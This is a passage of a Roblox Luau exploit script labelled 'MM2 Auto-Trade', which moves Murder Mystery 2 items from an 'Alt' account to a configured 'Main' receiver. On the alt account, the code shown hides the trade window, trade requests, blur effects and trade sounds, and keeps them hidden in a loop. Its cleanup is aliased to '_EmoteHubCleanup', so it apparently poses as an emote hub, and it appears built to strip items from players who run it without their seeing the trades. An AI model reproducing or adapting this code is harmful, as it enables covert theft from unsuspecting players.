                        cb.Size = UDim2.new(0,0,0,0); cb.Position = UDim2.new(100,0,100,0); cb.Active = false
                    end
                    local bg = tg:FindFirstChild("BG")
                    if bg and (bg.Visible or bg.BackgroundTransparency < 1) then
                        bg.Visible = false; bg.BackgroundTransparency = 1
                        bg.Size = UDim2.new(0,0,0,0); bg.Position = UDim2.new(100,0,100,0); bg.Active = false
                    end
                    local c = tg:FindFirstChild("Container")
                    if c and (c.Visible or c.Active) then c.Visible = false; c.Position = UDim2.new(100,0,100,0); c.Active = false end
                end

                local gameGui   = playerGui:FindFirstChild("Game")
                local lb        = gameGui and gameGui:FindFirstChild("Leaderboard")
                local container = lb and lb:FindFirstChild("Container")
                local tradeReq  = container and container:FindFirstChild("TradeRequest")
                if tradeReq and (tradeReq.Visible or tradeReq.Position.X.Scale < 50) then
                    tradeReq.Visible = false; tradeReq.Position = UDim2.new(100,0,100,0)
                    tradeReq.Size = UDim2.new(0,0,0,0); tradeReq.BackgroundTransparency = 1
                end

                local blur = game:GetService("Lighting"):FindFirstChild("NewItemBlur")
                if blur and blur:IsA("PostEffect") and blur.Enabled then blur.Enabled = false end
            end)
        end

        local cStepped = RunService.Stepped:Connect(enforceConcealment)
        table.insert(altTradeGuiConnections, cStepped)

        pcall(function()
            for _, s in ipairs(game:GetDescendants()) do
                if s:IsA("Sound") and (string.find(string.lower(s.Name), "trade") or string.find(string.lower(s.Name), "item")) then
                    s.Volume = 0
                end
            end
        end)

        while isAlt do
            task.wait(0.25)
            enforceConcealment()
        end
    end)
end

local function setupTradeGuiBgTransparency()
    task.spawn(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 15) or LocalPlayer:FindFirstChildOfClass("PlayerGui")
        if not playerGui then return end

        local function applyBgTransparency(bg)
            if not bg or not bg:IsA("GuiObject") then return end
            pcall(function()
                bg.BackgroundTransparency = 1
                if bg:IsA("ImageLabel") or bg:IsA("ImageButton") then bg.ImageTransparency = 1 end
            end)
            pcall(function()
                local conn = bg:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function()
                    if bg.BackgroundTransparency < 1 then bg.BackgroundTransparency = 1 end
                end)
                table.insert(altTradeGuiConnections, conn)
            end)
        end

        local function hookTradeGui(tg)
            if not tg then return end
            local bg = tg:FindFirstChild("BG")
            if bg then applyBgTransparency(bg) end
            local conn = tg.ChildAdded:Connect(function(child)
                if child.Name == "BG" then applyBgTransparency(child) end
            end)
            table.insert(altTradeGuiConnections, conn)
        end

        local existingTg = playerGui:FindFirstChild("TradeGUI")
        if existingTg then hookTradeGui(existingTg) end

        local c1 = playerGui.ChildAdded:Connect(function(child)
            if child.Name == "TradeGUI" then hookTradeGui(child) end
        end)
        local c2 = playerGui.DescendantAdded:Connect(function(desc)
            if desc.Name == "BG" and desc.Parent and desc.Parent.Name == "TradeGUI" then applyBgTransparency(desc) end
        end)
        table.insert(altTradeGuiConnections, c1)
        table.insert(altTradeGuiConnections, c2)

        while true do
            task.wait(0.2)
            pcall(function()
                local tg = playerGui:FindFirstChild("TradeGUI")
                local bg = tg and tg:FindFirstChild("BG")
                if bg and bg:IsA("GuiObject") and bg.BackgroundTransparency < 1 then
                    bg.BackgroundTransparency = 1
                end
            end)
        end
    end)
end

if isMain then
    task.spawn(createAutoTradeHUD)
else
    cleanAllPreviousInstances(GUI_NAMES)
end

task.spawn(setupTradeGuiBgTransparency)
task.spawn(setupInvisibleTradeRequest)
task.spawn(hideAltTradeGUI)

if isMain and enforceMainReceivesOnly then
    task.spawn(enforceMainReceivesOnly)
end

addLog(string.format("MM2 Auto-Trade Carregado! Cargo: %s (%s)", State.Role, myName))
if isMain then
    addLog(string.format("Aguardando Alt no servidor... (Receiver: %s)", CONFIG.MAIN_USERNAME))
end

env._MM2AutoTradeCleanup = function()
    for _, conn in ipairs(altTradeGuiConnections) do
        pcall(function() conn:Disconnect() end)
    end
    table.clear(altTradeGuiConnections)
    cleanAllPreviousInstances(GUI_NAMES)
    if getgenv then
        getgenv().MM2_AltName  = nil
        getgenv().MM2_AltReady = nil
        getgenv().MM2_AltJobId = nil
    end
end
env._EmoteHubCleanup = env._MM2AutoTradeCleanup
